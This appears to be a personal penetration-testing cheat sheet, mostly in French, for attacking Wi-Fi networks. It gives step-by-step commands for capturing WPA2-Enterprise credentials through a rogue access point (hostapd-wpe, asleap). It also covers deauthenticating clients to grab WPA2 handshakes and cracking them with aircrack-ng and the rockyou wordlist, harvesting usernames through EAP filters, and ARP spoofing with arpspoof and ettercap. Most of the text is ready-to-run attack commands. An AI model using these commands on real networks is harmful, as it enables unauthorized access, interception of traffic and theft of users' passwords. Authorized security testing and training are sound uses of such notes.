-> Explications:

	Pour WPA2 Personnal utiliser airmon-ng car cela fonctionne avec une Pre Shared Key
	Pour WPA2 Entreprise utiliser Rogue AP (hostapd-wpe) car les informations d'authent se font en backroung entre l'AP et un server Radius par ex, et encrypté en TLS

[*] hostapd-wpe

	Edit the SSID:
		-> nano /etc/hostapd-wpe/hostapd-wpe.conf

	Run:
		-> hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

	Once a user connected to the Rogue AP:
		-> zcat /usr/share/wordlists/rockyou.txt.gz | asleap -C [challenge] -R [response] -W -



[*] airmon-ng

	Pour commencer faire:
		airmon-ng start wlan0
	 En cas de probleme, faire: airmon-ng check kill
		airodump-ng wlan0mon


	On selectionne ensuite un SSID et un channel et on tape la commande:
		airodump-ng -c 6 --bssid 5A:A9:D2:62:E3:03 -w /root/docs/pentest/ wlan0mon

	Deconnecter un appareil du reseau pour recuperer le handshake (basé sur le channel d'écoute d'airodump, ici 6):
		aireplay-ng --deauth 0 -a 5A:A9:D2:62:E3:03  -c 54:99:63:C0:15:BF wlan0mon -w MyNameFile	(-a routeur -c appareil)

	Une fois que le handshake est capture, on tente de trouver le mdp avec un dictionnaire:
		aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/Documents/Pentest/-01.cap 


[*] tcpdump


[*] Wireshark:
	-> Difference Monitor vs Promiscuous
	-> Ex. de filtres: ip.addr == x.x.x.x
	-> Assembler des paquets: clic droit -> follow -> TCP/HTTP Stream
	-> passer en mode promiscuous ?
	-> filtrer selon un ssid ?

	-> filter: EAP 	=>	gto get the Reponse Identity (username harvesting)


-> Liens:
	-> https://gbhackers.com/wireless-penetration-testing-checklist-a-detailed-cheat-sheet/
	-> https://gist.github.com/dogrocker/86881d2403fee138487054da82d5dc2e
	-> google maps with Kismet	-> 	https://piratefache.ch/mapping-wifi-networks-on-google-maps/


ARP Spoofing (post-exploitation of the wifi):


[*] arpspoof
	   -> Ex: arpspoof -i [wlan0] -t [192.168.x.x (target)] -r [192.168.x.x (router)]

[*] ettercap
	-> Enable the ipv4 forwarding:
		sysctl -w net.ipv4.ip_forward=1
	-> Bridge sniffing: two network interfaces
	-> Unified sniffing: sniff


[*] responder
	-> In the case of an Active Directory
